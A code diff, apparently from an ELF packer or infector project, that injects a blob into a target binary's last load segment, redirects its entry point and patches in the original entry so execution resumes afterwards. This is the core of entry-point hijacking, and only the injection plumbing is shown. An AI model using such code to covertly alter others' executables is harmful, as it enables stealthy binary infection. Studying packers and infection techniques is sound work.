@@ -22,20 +22,24 @@ static void _insert_bzero(char **s, size_t *n, size_t pos, size_t add){
 }
 
 
-void update(char *b, size_t n, size_t entry){
+void update(char *b, size_t n, size_t old_entry, size_t entry){
 	//add a few information about himself
     Elf64_Ehdr *bh = (void*)b;
 	size_t pos = elf_offset_entry(b, n);
 
 	//modifying 2bit after
 	((size_t*)((char*)(b + pos + 2)))[0] = entry - pos;
+	printf("diff: %zx, size: %zx\n", entry - pos, n);
 	((size_t*)((char*)(b + pos + 2)))[1] = n;
+	//move to next entry
+	((u32*)((char*)(b + pos + 0x4a)))[0] = old_entry;
 }
 
 static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
     Elf64_Ehdr *h = (void*)*s;
     Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;
 
+	size_t old_entry = h->e_entry;
     int x = elf_last_load_segment(*s, *n);
     size_t diff = ph[x].p_memsz - ph[x].p_filesz;
     if (diff > 0){
@@ -55,7 +59,8 @@ static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
     elf_update_flags_of_load_segments(*s, *n);
 	elf_set_off_entry(*s, *n, pos + 1 + elf_offset_entry(b, bn));
 	elf_shift_offset(*s, *n, pos, bn+diff);
-	update((*s) + pos + 1, bn, h->e_entry);
+    h = (void*)*s;
+	update((*s) + pos + 1, bn, old_entry, h->e_entry);
 	return pos;
 }
 
